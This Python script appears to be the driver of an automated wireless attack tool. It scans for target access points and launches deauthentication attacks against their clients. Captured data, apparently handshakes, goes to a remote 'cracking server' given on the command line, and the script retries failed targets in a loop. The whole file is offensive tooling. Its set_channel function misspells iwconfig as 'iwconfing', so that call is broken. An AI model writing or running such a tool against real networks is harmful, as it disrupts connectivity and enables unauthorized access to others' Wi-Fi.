import sys
import argparse
import intel_collector
import stripload
import attacker
import exceptions
import time
import subprocess

ATTACK_TIMEOUT = 3 * 60
INTEL_TIMEOUT = 1 * 60

def set_channel(iface, channel):
    subprocess.check_call(["iwconfing", iface, "channel", str(channel)])


def str2addr(s):
    ip,port = s.split(":")
    return (ip, int(port))

def main(args):
    parser = argparse.ArgumentParser()
    parser.add_argument("iface", help="interface in monitor mode")
    parser.add_argument("server", help="ip:port of cracking server")
    parsed = parser.parse_args(args[1:])

    intel = intel_collector.IntelCollector(parsed.iface)
    stripper = stripload.StripLoad(parsed.iface, str2addr(parsed.server))
    stripper.start()
    intel.start()
    failed = []

    while True:
        intel.active()
        ignored_targets= [f[0] for f in failed if time.time() - f[1] < ATTACK_TIMEOUT / 2]
        target, clients = intel.choose_target(INTEL_TIMEOUT, ignore=ignored_targets)
        intel.passive()
        attack = attacker.DeauthAttacker(parsed.iface, target, client=clients[0] if clients else None)
        attack.start()
        try:
            stripper.wait_load(target, ATTACK_TIMEOUT)
        except exceptions.Exception:
            failed.append((target, time.time()))

        intel.ignore(target)
        attack.stop()


if __name__ == "__main__":
    sys.exit(main(sys.argv))